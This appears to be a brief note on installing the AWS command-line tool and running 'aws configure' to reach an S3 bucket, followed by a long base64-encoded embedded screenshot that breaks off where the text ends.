This allows us to interact with an S3 bucket. 

~install 

$sudo apt-get install awscli 

~First thing is to configure it with something, such as 'temp' 

$aws configure 

![](data:image/png;base64,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